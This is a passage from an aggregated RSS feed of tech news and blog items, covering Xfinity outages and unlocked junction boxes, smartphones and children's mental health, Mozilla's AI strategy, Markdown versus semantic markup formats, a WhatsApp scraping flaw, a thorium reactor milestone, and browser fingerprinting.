PM. Others cluster in early morning around 2-3 AM. This is not random.This is an infrastructure problem on Xfinity’s network. Not on my end. Not on my neighbor’s end. Upstream. Somewhere on their equipment something is failing for exactly 125 seconds multiple times per day.I have the data. I have the patterns. I have another customer (my neighbor) on a different line experiencing the exact same thing.Xfinity has all this information. They know about the problem. They just won’t investigate it.Support can’t understand technical data. They follow scripts. When I attempted to explain monitoring logs they had no framework for discussing it. They blamed my equipment because that’s what they’re trained to do.Nobody has authority to escalate. Retention transferred me to tech support. Tech support couldn’t care nor help. They dug up my yard and placed a new line which did nothing to solve the problem. Nobody would actually order an investigation into the upstream infrastructure.There’s no pressure to fix it. Xfinity is the only gigabit provider in this area. No competition. No alternatives. I can’t leave. So they don’t have to care.A 2-minute outage every few hours is “tolerable.” It’s annoying enough to frustrate customers but not enough to make them quit (since they have nowhere else to go). It’s cheap to ignore compared to actually investigating and fixing it.There’s Also a Security ProblemAbout half of the Xfinity junction boxes in my neighborhood are unlocked or broken. Anyone can walk up and disconnect whomever they want.If your home security system is on Xfinity with no wireless backup, someone can just walk to the street and physically disconnect your internet, rob your house, and your security system won’t notify you.I’ve done everything I can do as a customer:Documented the problem professionallyEscalated through all available channelsProvided technical evidenceBeen ignored at every levelThe problem is real. My neighbor confirms it. Everyone downstream of whatever is broken on their infrastructure probably has it too.I can’t fix this. Only Xfinity can. And they won’t.So I’m publishing this hoping someone with actual authority, perhaps someone at a regulatory agency, someone at a news outlet, someone who has power over Xfinity sees this and decides to actually investigate.Because I’m out of options. My neighbors are out of options. And Xfinity’s counting on us staying out of options. Because this is the reality of my neighborhood (source):If you’re in Sacramento County and have Xfinity internet, check two things:1. Walk to your junction box. Is it locked? If not, you have a physical security problem.2. Look at where your cable grounds. Does it go to your electrical panel? Or to a water pipe? If it’s a water pipe or PVC, that’s wrong.3. Have you noticed your connection drop briefly multiple times a day? Same times of day? If you see a pattern, document it. You might have the same problem.If you want to report this:]]></content:encoded></item><item><title>NTSB report: Decryption of images from the Titan submersible camera [pdf] (2024)</title><link>https://data.ntsb.gov/Docket/Document/docBLOB?ID=18741602&amp;FileExtension=pdf&amp;FileName=Underwater%20Camera%20-%20Specialist%27s%20Factual%20Report-Rel.pdf</link><author>bmurray7jhu</author><category>dev</category><pubDate>Sun, 23 Nov 2025 00:35:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>WorldGen – Text to Immersive 3D Worlds</title><link>https://www.meta.com/en-gb/blog/worldgen-3d-world-generation-reality-labs-generative-ai-research/</link><author>smusamashah</author><category>dev</category><pubDate>Sat, 22 Nov 2025 21:20:24 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Get Facebook on Your PhoneStay connected anytime, anywhere.]]></content:encoded></item><item><title>Kids who own smartphones before age 13 have worse mental health outcomes: Study</title><link>https://abcnews.go.com/GMA/Family/kids-smartphones-age-13-worse-mental-health-outcomes/story?id=123961082</link><author>donsupreme</author><category>dev</category><pubDate>Sat, 22 Nov 2025 21:11:15 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Children, especially girls, who own smartphones before they are 13 years old may have worse mental health outcomes when they're older, a new study suggests.The study, published Sunday in the Journal of Human Development and Capabilities, analyzed self-reported questionnaire results from more than 100,000 young adults between the ages of 18 and 24.The questionnaire asked respondents about mental health symptoms, such as having aggression, feelings of detachment, hallucinations and suicidal thoughts. Those who were given smartphones at an earlier age were associated with worse mental health outcomes for every year of smartphone ownership before the age of 13.Early smartphone ownership was associated with feelings of lower self-image and lower self-worth in both girls and boys. Girls reported lower emotional resilience and lower confidence, while boys reported feeling less calm, less stable and less empathetic."The younger the child gets a smartphone, the more exposure to all this impacts them psychologically and shapes the way they think and view the world," Tara Thiagarajan, one of the study's authors, told ABC News in an emailed statement.About 48% of young women who had smartphones by 5 or 6 years old reported having severe suicidal thoughts, compared to 28% of females who had smartphones by 13 or older.In young men, 31% of those who had smartphones by 5 or 6 years old reported having severe suicidal thoughts and 20% of males who had smartphones by 13 or older reported having severe suicidal thoughts.Study authors attributed the differences between young women's and young men's mental health symptoms to social media usage. Other factors that seemed to impact mental health outcomes were cyberbullying, poor sleep and poor family relationships.The study's authors recommended restricting smartphone and social media access for kids under 13, promoting digital literacy education and corporate accountability."Ideally, children should not have a smartphone until age 14, and when they do get a smartphone, parents should take the time to discuss with their children how to interact on the Internet and explain the consequences of doing various things," Thiagarajan added."The longer we can push off allowing our kids to be on social media, we are learning, the better," Narula said. "I think lots of families are getting creative … landlines …. flip phones for kids [are] maybe an option so that they can have access to communicating without all the other things that come with smartphones."The study's findings come amid an effort led by social psychologist Jonathan Haidt, author of "Anxious Generation," to limit kids' smartphone use due to the impact on their mental health. Haidt has proposed setting nationwide "norms" or guidelines, including not giving children a smartphone before high school, no social media before age 16 and establishing schools as phone-free zones.Pediatrician Dr. Natasha Burgert also recommended that parents demonstrate to children how to use smartphones responsibly."Children watch everything you do -- and that doesn't stop until they leave your house," Burgert told ABC News via email. "Connect authentically and meaningfully for a few minutes every day, and show your children that the humans we live with are more important and worthy of our attention than our phones."The American Academy of Pediatrics also recommends families follow the 5 C's of media use, including teaching kids and teens how to be safe online, since content and advertisements may be targeting an older audience. - Consider your child and their personality. What media are they drawn to and how do they react to it? - Consider the content of the media your child consumes. Encourage them to consider good media sources. - Help your child learn how to manage their emotions, including without the help of media. - Consider what your family would like to spend more quality time doing, besides consuming media. - Discuss media with children early and often and encourage learning digital literacy.]]></content:encoded></item><item><title>Terence Tao: At the Erdos problem website, AI assistance now becoming routine</title><link>https://mathstodon.xyz/@tao/115591487350860999</link><author>dwohnitmok</author><category>dev</category><pubDate>Sat, 22 Nov 2025 20:27:41 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The Mozilla Cycle, Part III: Mozilla Dies in Ignominy</title><link>https://taggart-tech.com/mozilla-cycle-pt3/</link><author>holysoles</author><category>dev</category><pubDate>Sat, 22 Nov 2025 20:21:56 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I owe Mozilla a thank-you. Really, I do. Maybe an Edible Arrangement? People like those. Some lil pineapples cut into stars on sticks and chocolate strawberries might brighten their day. For the note, I'm thinking something like:Thank you for proving me exactly right.Eight months ago, in the fallout of Mozilla's fumbling of a Privacy Policy update, I wrote:Mozilla is pursuing its primary objective, which is the survival of Mozilla. Its mission statement is more than broad enough to accommodate that, and Firefox is not a real priority. The community should accept that and stop waiting for Mozilla to be the hero they deserve.Regrettably, I was unable to take my own advice on the last part. So here we are yet again, marveling at Mozilla's dedication toward eroding decades of goodwill in the community they purportedly serve. To quote one of my sacred texts, it's a focus and intensity normally seen only in successes.Back in the present, we have Mozilla thing down on this direction. First, with their announcement of "AI Window," a new feature (used very loosely) coming to Firefox which seems to emulate the user experience offered by AI browsers like Perplexity's Comet or OpenAI's Atlas. In other words, instead of performing search from the address bar and interacting with websites like browsers have done since they were invented, your first interaction will be with a language model prompt, which then mediates your experience of the web.The response from the Firefox community has not just been overwhelmingly negative, it is  negative as far as I can tell. At least among users willing to post on Mozilla's forums about the issue, which is absolutely a biased sample set. I have received some comments separately in support of Firefox, but they are countable and the vast, vast minority. Mozilla's core audience hates this move. At the very least, they would want all the AI components of Firefox to be opt-in, a choice that Firefox has been unwilling to make so far, instead enabling these new features by default.What does Mozilla do? Temper the plan? Ease up on the forced features?Nah, they do what any good corporate PR person would tell you to do when facing public backlash: post through it.This post is a summary of Mozilla's new Strategic Plan, which is viewable in full here. I read it through a few times, and my brain nearly ripped in half from the cognitive dissonance involved. But I think it's worth examining Mozilla's claims carefully. They are:AI (by which they mean generative AI) is a transformative technology that will fundamentally alter how we interact with machines and the web.The current landscape is dangerous and controlled by big tech and "closed source" models.Mozilla should therefore pivot to develop and support "open source" AI implementations the same way they advocated for open web standards.The strategy details the "what" and "how" of Mozilla's transformation in this direction. We're going to touch on some of those points, but let's begin with these big claims, affording Mozilla maximum benefit of the doubt.Is generative AI a transformative technology? The Corpos sure seem to want it to be, although its actual usage seems mostly to be chatbot-related. All other attempts to use this trick in other realms have failed rather miserably. Microsoft, for example, wants you to talk to your computer instead of using a mouse and keyboard . The results, unfortunately, are much worse than the Jurassic version of computer interaction. The pattern holds true across the board. Google's AI Overview continues to be an inferior provider of information than solid web search results. Also, as it turns out, people learn less from LLM output.Generative AI is transforming something, but I don't think it's the web, and I don't think it's for the better.Which means their second claim is definitely true! The current landscape  dangerous, as I've been decrying for years.But because Mozilla is convinced that generative AI is a force for good (with no evidence to back that claim up), they conclude that their mission must be to create "open source" alternatives to commercial ("big tech") offerings.If you truly believe generative AI is a net good but with potential for significant harm, there are arguments to be made for ethical implementations. This same instinct is what propelled researchers from OpenAI to split and found Anthropic.This, however, is an article of faith. It cannot be argued rationally because no empirical evidence exists to support it. The entirety of the belief is predicated on future potential—and it always will be, right up until the harms are so inescapably clear that even the most ardent of believers suffer because of them. Even then, not all of the Flock will lose faith. And as we now see, Mozilla leadership are not just the Flock, but Disciples.Mozilla has had a conversion experience, while its core audience has not. This results in a schism of purpose.Digging into the plan itself, Mozilla's ambitions are remarkable. Mozilla has, as the plan notes, always measured itself against a "double bottom line" of mission and market success. However, it seems these two criteria are now separately defined by: "a. AI that advances the Manifesto; and b. diversifying revenue away from search."Their specific goals include:All Mozilla orgs have a flagship AI product by 202810% year-over-year community growth20% year-over-year growth in non-search revenue3 Mozilla orgs have more than $25M in revenue (currently: 1)10% year-over-year investment portfolio returnsI am dumbfounded by these goals. I can't even be snarky about them. They seem so disconnected from reality that I can't imagine how a Board arrived at them.Let's go through them one at a time.What "orgs" are we talking about here? Historically there have been two Mozilla organizations: the Mozilla Foundation, which is the not-for-profit to which you donate to preserve the open web); and the Mozilla Corporation, which develops Firefox, makes deals with search engines, and creates other revenue-generating projects like, uh, Pocket.There now exist three other for-profit subsidiaries of the Foundation, although these are not mentioned in the official listings. The first is MZLA Technologies Corporation, which is responsible for Thunderbird. I can't tell what else they do, if anything.Another is Mozilla.ai, which has a much clearer purpose. This company produces AI products and services. So of these organizations, 3 of them need to have flagship AI products by 2028. What could that  look like?There is also Mozilla Ventures, which is literally just a venture capital firm throwing money at AI projects that align with Mozilla's Manifesto.Mozilla.ai has the easiest and clearest road, as their Agent Platformis already in early access and is absolutely a commercial product. MZLA has...Thunderbird? So AI-powered Thunderbird? That's what I can figure, although Thunderbird is not exactly known as an AI platform. Their new paid Thunderbird Pro service currently makes no mention of AI integration. That's a headscratcher. Mozilla VenturesAnd finally, we have the Corporation and Firefox.Let's be as clear as we can possibly be. , and Firefox will be a flagship AI product according to this strategic plan. This is the focus for Mozilla, which means users of Firefox will only get more and more AI shoved down their throat, and likely fewer ways to avoid it.I don't have access to Mozilla's "community" numbers, however they choose to define them. But if the reaction to recent changes is any indication, expecting growth of any kind isn't just optimistic, it's delusional. They are betraying the principles of their core use base in favor of their new god. That behavior is usually not rewarded by users or customers.While I don't have access to community numbers, the Mozilla Foundation must disclose its financials, so that I can review—and you can too, if you're broken like me. I don't want to think about how much time I've spent reading Mozilla's 990s.Looking at their revenue change from 2022 to 2023, we see a  of 3% in royalties (search deals) and almost 15% in subscriptions and advertising. Let's also note that by these counts, royalties account for about 76% of Mozilla's annual revenue. That's by my own calculation on these disclosure, but Mozilla themselves cite 85% as share of revenue from search alone.2022's numbers show a similar drop (down 3% from 2021) in royalties, but a 25% (!!) jump in subscriptions and ad revenue. My guess is ads, since I don't think the VPN service is raking it in, nor do I think a bunch of people suddenly signed up for Pocket before it died. This would certainly explain why last year, Mozilla went hard on their "privacy-honoring" advertising acquisition.Zooming back out: the current business model is not delivering growth. So the pivot to AI is a bet that investment is out there for alternative sources of AI technology. It's also, tacitly, a bet that the AI bubble will last long enough to get competing products off the ground and attract investment before it's too late.As far as their investment portfolio's performance, Mozilla has changed their strategy significantly in the last 3 years, resulting in significant increases in dividend and realized gains in investments. What's the change in strategy?At the end of 2022, Mozilla changed our strategy for managing our financial reserves. In prior years we took a purely defensive approach, investing solely in highly liquid fixed-income securities. Our revised approach is focused on delivering a total return to Mozilla after inflation, while maintaining sufficient liquid reserves to weather economic pressures and seize growth opportunities.Translation: we invested more in stocks and less in bonds, T-notes, and CDs. What specifically they've invested in is unclear, but you can probably guess it rhymes with Blavidia. I'm sure they have a diversified portfolio, but  you believe (as I do) that the market is heading for a massive correction, this goal is unattainable and a dangerous target for a strategic plan.Lastly, on revenue. Mozilla plainly  to diversify away from search, because search is dying. Google itself is trying to kill it, in favor of AI. If this succeeds, Firefox's primary revenue stream is drying up, and they know it. More than anything else, this is the reason for the pivot. As I've said before, the will to survive takes precedence over principle when choosing a path forward for any organization, even a not-for-profit with a stated mission.These goals are not so much reasonable expectations as existential mandates. Either Mozilla approaches these targets in 3 years, or they may be staring death in the face.This strategy hinges on three stated hypotheses from Mozilla:A generational shift in human computer interaction is widening the gap between Mozilla’s products and trustworthy, user-centered experiences.A vibrant, successful and decentralized open source AI ecosystem is essential if we want independent tech players to thrive — and for innovation to come from everywhere.The growing need for sovereign, public interest AI which will only be met by governments and public interest tech players pooling resources and banding together.That's...okay. We'll take it from the top.Would you say generative AI is a "generational shift in human computer interaction?" The Corpos want it to be, but so far this hasn't taken place. Declaring it thus is the wish becoming the father of the thought. Maybe someday a functional language model will govern our interaction with computing machines, but that is nowhere near the case now, and the fundamental flaws in the technology preclude it from being so in the foreseeable future.Would you say generative AI is "trustworthy" or "user-centered?" The people who implicitly trust generative AI are suffering from psychosis. It's a pathology. The model creators themselves tell you not to trust them! What are we doing here?Y'know what is trustworthy? A goddamned URL bar that takes me to the website I want to go to. A search engine that shows me sources, ideally curated for quality.Okay so hypothesis 1 doesn't pass the sniff test. On to number 2.Can someone please explain to me what the hell "open source AI" is? Mozilla's helpful Strategy Wiki lists Mozilla's own products and investments under this category. Remember that for LLMs, you have two major "source" components: the dataset on which a model was trained, and the resulting vectors/weights file that comprises the model. Among them is HuggingFace, which is probably best understood as GitHub for AI. HuggingFace hosts both models and datasets used in ML/AI applications. It's about as close to open source AI as I can imagine.But let's be clear about Mozilla's value proposition of the "transformative" generative AI. These are not small models we're talking about; these are large language models that were trained on massive corpora of text. Those corpora are the "source." We know that the training data for frontier models comes from copyrighted material and material scraped without consent. We also know that code generated from scraped sources may well violate the licenses of that source code in reproduction.In other words, there can never be an open source large language model when the sources are themselves violate of content usage agreements. For all the talk about "ethical" AI, Mozilla fails to address this original sin of the technology.I'm sorry, I should say "nearly fails." In the "Threats" section of their SWOT analysis of their own strategy, they identify "Open models disappear" as a threat:Big tech / China stop releasing open models. No public open source frontier models emerge. Mozilla’s strategy is obsolete / outflanked.Okay so by "open source AI" you actually mean Qwen/Deepseek/Llama. Cool. Cool cool cool. These are open weight , so the premise of open data goes out the window. And this threat gives away the fact that Mozilla can only succeed on the backs of frontier models. There is no real plan to "democratize" LLMs, nor can there be for the scale required.This entire exercise is a farce. Yet again, Mozilla pursues a parasitical relationship with the corpos. It worked last time, right??Hypothesis 3: the growing need for "sovereign" AI. We've already established that there is no large language model possible without corpo scale and investment, except perhaps with government support. So is that what Mozilla wants? State-sponsored LLMs? This hypothesis points in that direction, with Mozilla as the "public interest tech player" catching a percentage somewhere in the middle. Being a government intermediary is also probably not a safe position for anyone at this juncture, much less a tech company.But also, what "need" are we talking about here? Why is there a need for any of this at all?Again we encounter the fundamental schism of purpose between Mozilla trying to survive, and the mission its core audience believes in. You could imagine a Mozilla that decided, "Actually, the web was better without this dreck in it, and the experience of the web is not improved by moving users closer to it." You could imagine an organization that doubled down on true privacy, and a human-centered web. We'll never know what kind of funding streams such an organization could build, because Mozilla has chosen the machines over people. They have chosen quick revenue over long-term sustainability.It's finally time you and I take the advice I offered before: let Mozilla die. It no longer serves its stated purpose.]]></content:encoded></item><item><title>Markdown is holding you back</title><link>https://newsletter.bphogan.com/archive/issue-45-markdown-is-holding-you-back/</link><author>zdw</author><category>dev</category><pubDate>Sat, 22 Nov 2025 20:03:14 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I've used many content formats over the years, and while I love Markdown, I run into its limitations daily when I work on larger documentation projects. In this issue, you'll look at Markdown and explore why it might not be the best fit for technical content, and what else might work instead. Markdown is everywhere. It's human-readable, approachable, and has just enough syntax to make docs look good in GitHub or a static site. That ease of use is why it's become the default choice for developer documentation. I'm using Markdown right now to write this newsletter issue. I love it.But Markdown's biggest advantage is its biggest drawback: it doesn't describe the content like other formats can.Think about how your content gets consumed. Your content isn't just for human readers. Machines use it too. Your content gets indexed by search engines, and parsed by LLMs, and those things parse the well-formed HTML your systems publish. Markdown's basic syntax only emits a small subset of the available semantic tags HTML allows.IDE integrations can use your docs, too. And AI agents rely on structure to answer developer questions. If you're only feeding them plain-text Markdown documents to reduce the number of tokens you send, you're not providing as much context as you could.Worse, when you want to reuse your content or syndicate content into another system, you quickly find out that Markdown is more of the lowest common denominator than a source of truth, as not all Markdown flavors are the same.There are other options you can use that give you more control. But first, let's look deeper into why you should move away from Markdown for serious work.Markdown is "implicit typing" for contentIf you're a developer, you know all about type systems in programming languages. Some languages use Implicit typing, in which the compiler or interpreter infers the data type from the value. These languages give you flexibility, but no guarantees. That's why many developers prefer languages that use explicit typing, where you predefine data types when writing the code. In those languages, the compiler doesn't just build your code; it guarantees specific rules are followed. That's the main reason for the rise of TypeScript over JavaScript: compile-time guarantees.Markdown is implicit typing. It lets you write quickly, but without constraints or guarantees. There's no schema. No way to enforce consistency. A heading in one file might be a , in another it might be a , and there's no machine-readable distinction between the two.To complicate things further, there are multiple flavors of Markdown, each with its own features and markup. Here are just a few:You think you're writing "Markdown," but what works in one tool may not render in another. Some Markdown processors allow footnotes, Others ignore soft line breaks. And some even require different formatting for code blocks. Inconsistency makes Markdown a shaky foundation for anything beyond the most basic document.And then there's MDX, which people often use to extend Markdown to support things it doesn't:Here's a typical MDX snippet:# Install

<Command>npm install my-library</Command>
That  tag isn't Markdown at all; it's a React component. Instead of using a code block, the author chose to create a special component to standardize how all commands would display in the documentation. It works beautifully on their site because their publishing system knows what  means. But if they try to syndicate this content to another system, it breaks because that system also needs to implement that component. And even if it was supported elsewhere, there's no guarantee that the component is implemented the same way. MDX shows that even in Markdown-centric ecosystems, people instinctively add more expressive markup. They know plain Markdown isn't enough. They're reinventing semantic markup, but in a way that's custom, brittle, and not portable.Why semantic markup mattersSemantic markup describes , not just . It's the difference between saying "here's a bullet with some text" and "here's a step in a procedure." To a human, those may look the same on a page. To a machine or to a publishing pipeline, they are entirely different. Web developers already went through all this with HTML. Prior to HTML5, you had  as a logical container. But HTML5 introduced ,  , , and many other elements that described the content. Semantic markup matters for two important and related reasons: . With semantic markup, you can publish the same content to HTML, PDF, ePub, or even plain Markdown. With Markdown as your source, you can't easily go to another format. You can't turn a bullet into a  or a paragraph into a  without guessing. You can't add context if it wasn't there to begin with, but you can strip out what you don't need when you transform the document, and you can choose how to present each thing in a consistent way. . LLMs and agents can make better use of content that carries structure. A step marked as a  is unambiguous. A bullet point might be a step, or a note, or just a list item. The machine has to guess. This is why XML was a preferred mechanism for web services for a long time, and why JSON Schema exists.Let's explore four formats that give you more control over structure than plain Markdown.reStructuredText is a plain-text markup language from the Python/Docutils ecosystem that supports directives, roles, and structural semantics. It is the foundational format used by Sphinx for generating documentation.

   npminstallmy-library

  
   This library requires Node.JS ≥ 22.

See also .
Here you see a  directive, an admonition (), and an explicit cross-reference via . You'll find support for images, figures, topics, sidebars, pull quotes, epigraphs, and citations as well.All of those encode semantics, not just presentation. AsciiDoc aims to be human-readable but semantically expressive. It has attributes, conditional content, include mechanisms, and more. Here's an example of AsciiDoc:= Installation
:revnumber: 1.2
:platform: linux
:prev_section: introduction
:next_section: create-project

[source,bash]
----
npm install my-library
----

NOTE: This library requires Node.JS ≥ 22.

See <<usage,Usage Guide>> for examples.
AsciiDoc has native support for document front-matter. Attributes like  or  let you parameterize content.  is a cross-reference syntax. Like reStructuredText, AsciiDoc supports admonitions like  and  so you don't have to build your own custom renderer. It also has support for sidebars, and you can add line highlighting and callouts to your code blocks without additional extensions. And if you're writing technical documentation, there's explicit support for marking up UI elements and keyboard shortcuts.Using AsciiDoctor, you can transform AsciiDoc into other formats, including HTML, PDF, ePub, and DocBook, which you'll look at next.DocBook is an XML-based document model explicitly designed for technical publishing. It expresses hierarchical and semantic structure in tags and attributes, enabling industrial-grade transformations.  Installationnpminstallmy-libraryThislibraryrequiresNode.JS=22UsageGuideEvery tag is meaningful:  vs ,  vs . You'll find predefined tags for function names, variables, application names, keyboard shortcuts, UI elements, and much more. Being able to mark up the specific product names and terminology you use makes it so much easier to create glossaries and indexes. And Docbook has tags for defining index terms, too.DocBook's rich ecosystem of XSLT stylesheets supports transforming to HTML, PDF, man pages, and even Markdown. Using DocBook ensures structure and validation at scale, as long as you use the tags it provides.  DITA (Darwin Information Typing Architecture)DITA is a standard for writing, managing, and publishing content. It's a topic-based XML architecture with built-in reuse, specialization, and modular content design. It's an open standard, and it's widely used in enterprises for multi-channel, structured content that needs standardization and reuse. Installationnpminstallmy-libraryThislibraryrequiresNode.js=22DITA defines types like  and , which cleanly map to procedural structure. You can compose topics, reuse via content references (conrefs), and specialize as your domain evolves. One of the more interesting features DITA provides is the ability to filter content and create multiple versions from a single document.The DITA Open Toolkit and many enterprise tools handle rendering, transformation, and reuse pipelines.  Yes, XML. The syntax is more verbose than Markdown. Tooling is less ubiquitous than Markdown. Migration requires effort, and your team may resist the learning curve. For small docs, Markdown's features are often enough.But if you're already bolting semantics onto Markdown with MDX or plugins or custom scripts, you're paying that complexity cost anyway, and you don't get the benefits of standardization or portability. You're building a fragile, custom semantic layer instead of adopting one that already works.So where does that leave you?If you're writing a quick  or a short-lived doc, Markdown is fine. It's fast, approachable, and does the job. If you're building a developer documentation site that needs some structure, reStructuredText or AsciiDoc are better choices. They balance expressiveness with usability. And if you're managing a large doc set that needs syndication, reuse, and multi-channel publishing, DocBook and DITA give you the semantics and tooling to make that process more manageable.The key is to start with the richest format you can manage and export downward. Markdown makes a great output for developers. It's approachable and familiar. But be careful not to lock yourself into it as your source of truth, because you can't add context back as easily as you can strip it out.I have a new book out. Check out Write Better with Vale. This book walks you through implementing Vale, the prose linter, on your next writing project to create consistent, quality content.Tidewave.ai is a full-stack coding agent from the creators of the Elixir programming language. It supports Ruby on Rails, Phoenix, and React applications and has a free tier. You'll need an API key for OpenAI, Anthropic, or GitHub Copilot to use it.Google's Chrome for Developers blog has a post on creating accessible carousels. It's worth the read if you have to implement one of these on your site.Before the next issue, here are a couple of things you should try to get some hands-on experience with a different format. As always, thanks for reading. Share this issue with someone who you think would find this helpful.]]></content:encoded></item><item><title>WhatsApp API flaw let researchers scrape 3.5 billion accounts</title><link>https://www.bleepingcomputer.com/news/security/whatsapp-api-flaw-let-researchers-scrape-35-billion-accounts/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sat, 22 Nov 2025 18:53:21 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Researchers compiled a list of 3.5 billion WhatsApp mobile phone numbers and associated personal information by abusing a contact-discovery API that lacked rate limiting. [...]]]></content:encoded></item><item><title>Show HN: Forty.News – Daily news, but on a 40-year delay</title><link>https://forty.news/</link><author>foxbarrington</author><category>dev</category><pubDate>Sat, 22 Nov 2025 18:47:08 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>China reaches energy milestone by &quot;breeding&quot; uranium from thorium</title><link>https://www.scmp.com/news/china/science/article/3331312/china-reaches-energy-independence-milestone-breeding-uranium-thorium</link><author>surprisetalk</author><category>dev</category><pubDate>Sat, 22 Nov 2025 17:49:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[An  developed in the Gobi Desert by the Chinese Academy of Sciences’ Shanghai Institute of Applied Physics has achieved thorium-to-uranium fuel conversion, paving the way for an almost endless supply of nuclear energy.The achievement makes the 2 megawatt liquid-fuelled thorium-based molten salt reactor (TMSR) the only operating example of the technology in the world to have successfully loaded and used thorium fuel.According to the academy, the experiment has provided initial proof of the technical feasibility of using thorium resources in molten salt reactor systems and represents a major leap forward for the technology.It is the first time in the world that scientists have been able to acquire experimental data on thorium operations from inside a molten salt reactor, according to a report by Science and Technology Daily.The article, published on Saturday, was China’s first official confirmation of its success in the development of TMSR technology, an innovation that is poised to reshape the future of clean sustainable nuclear energy.Trump orders US military to resume nuclear weapons tests for first time in 33 yearsTrump orders US military to resume nuclear weapons tests for first time in 33 yearsLi Qingnuan, Communist Party secretary and deputy director at the Shanghai Institute of Applied Physics, told the newspaper that “since achieving first criticality on October 11, 2023, the thorium molten salt reactor has been steadily generating heat through nuclear fission”.]]></content:encoded></item><item><title>The realities of being a pop star</title><link>https://itscharlibb.substack.com/p/the-realities-of-being-a-pop-star</link><author>lovestory</author><category>dev</category><pubDate>Sat, 22 Nov 2025 17:47:23 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The privacy nightmare of browser fingerprinting</title><link>https://kevinboone.me/fingerprinting.html</link><author>ingve</author><category>dev</category><pubDate>Sat, 22 Nov 2025 17:08:36 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I imagine that most people who take an interest in de-Googling are
concerned about privacy. Privacy on the Internet is a somewhat nebulous
concept, but one aspect of privacy is surely the prevention of your web
browsing behaviour being propagated from one organization to another. I
don’t want my medical insurers to know, for example, that I’ve been
researching coronary artery disease. And even though my personal safety
and liberty probably aren’t at stake, I don’t want to give any support
to the global advertising behemoth, by allowing advertisers access to
better information about me.Unfortunately, while distancing yourself from Google and its services
might be a necessary first step in protecting your privacy, it’s far
from the last. There’s more to do, and it’s getting harder to do it,
because of browser fingerprinting.Until about five years ago, our main concern surrounding browser
privacy was probably the use of third-party tracking cookies. The
original intent behind cookies was that they would allow a web browser
and a web server to engage in a conversation over a period of time. The
HTTP protocol that web servers use is ; that is, each
interaction between browser and server is expected to be complete in
itself. Having the browser and the server exchange a cookie (which could
just be a random number) in each interaction allowed the server to
associate each browser with an ongoing conversation. This was, and is, a
legitimate use of cookies, one that is necessary for almost all
interactive web-based services. If the cookie is short-lived, and only
applies to a single conversation with a single web server, it’s not a
privacy concern.Unfortunately, web browsers for a long time lacked the ability to
distinguish between privacy-sparing and privacy-breaking uses of
cookies. If many different websites issue pages that contain links to
the same server – usually some kind of advertising service – then the
browser would send cookies to that server, thinking it was being
helpful. This behaviour effectively linked web-based services together,
allowing them to share information about their users. The process is a
bit more complicated than I’m making it out to be, but these third-party
cookies were of such concern that, in Europe at least, legislation was
enacted to force websites to disclose that they were using them.Browsers eventually got better at figuring out which cookies were
helpful and which harmful and, for the most part, we don’t need to be
too concerned about ‘tracking cookies’ these days. Not only can browsers
mitigate their risks, there’s a far more sinister one: browser
fingerprinting.Browser fingerprinting does not depend on cookies. It’s resistant, to
some extent, to privacy measures like VPNs. Worst of all, steps that we
might take to mitigate the risk of fingerprinting can actually worsen
the risk. It’s a privacy nightmare, and it’s getting worse.Fingerprinting works by having the web server extract certain
discrete elements of information from the browser, and combining those
elements into a numerical identifier. Some of the information supplied
by the browser is fundamental and necessary and, although a browser
could fake it, such a measure is likely to break the website.For example, a fingerprinting system knows, just from information
that my browser always supplies (and probably has to), that I’m using
version 144 of the Firefox browser, on Linux; my preferred language is
English, and my time-zone is GMT. That, by itself, isn’t enough
information to identify me uniquely, but it’s a step towards doing
so.To get more information, the fingerprinter needs to use more
sophisticated methods which the browser could, in theory, block. For
example, if the browser supports JavaScript – and they nearly all do –
then the fingerprinter can figure out what fonts I have installed, what
browser extensions I use, perhaps even what my hardware is. Worst of
all, perhaps, it can extract a . Canvas
fingerprinting works by having the browser run code that draws text
(perhaps invisibly), and then retrieving the individual pixel data that
it drew. This pixel data will differ subtly from one system to another,
even drawing the same text, because of subtle differences in the
graphics hardware and the operating system.It appears that only about one browser in every thousand share the
same canvas fingerprint. Again, this alone isn’t enough to identify me,
but it’s another significant data point.Fingerprinting can make use of even what appears to be trivial
information. If, for example, I resize my browser window, the browser
will probably make the next window the same size. It will probably
remember my preference from one day to the next. If the fingerprinter
knows my preferred browser window size is, say, 1287x892 pixels, that
probably narrows down the search for my identify by a factor of a
thousand or more.Why crude
methods to defeat fingerprinting don’t workYou might think that a simple way to prevent, or at least hamper,
fingerprinting would be simply to disable JavaScript support in the
browser. While this does defeat measures like canvas fingerprinting, it
generates a significant data point of its own: the fact that JavaScript
is disabled. Since almost every web browser in the world now supports
JavaScript, turning it off as a measure to protect privacy is like going
to the shopping mall wearing a ski mask. Sure, it hides your identify;
but nobody’s going to want to serve you in stores. And disabling
JavaScript will break many websites, including some pages on this one,
because I use it to render math equations.Less dramatic approaches to fingerprinting resistance have their own
problems. For example, a debate has long raged about whether a browser
should actually identify itself at all. The fact that I’m running
Firefox on Linux probably puts me in a small, easily identified group.
Perhaps my browser should instead tell the server I’m running Chrome on
Windows? That’s a much larger group, after all.The problem is that the fingerprinters can guess the browser and
platform with pretty good accuracy using other methods, whether the
browser reports this information or not. If the browser says something
different to what the fingerprinter infers, we’re back in ski-mask
territory.What about more subtle methods to spoof the client’s behaviour?
Browsers (or plug-ins) can modify the canvas drawing procedures, for
example, to spoof the results of canvas fingerprinting. Unfortunately,
these methods leave traces of their own, if they aren’t applied subtly.
What’s more, if they’re applied rigorously enough to be effective, they
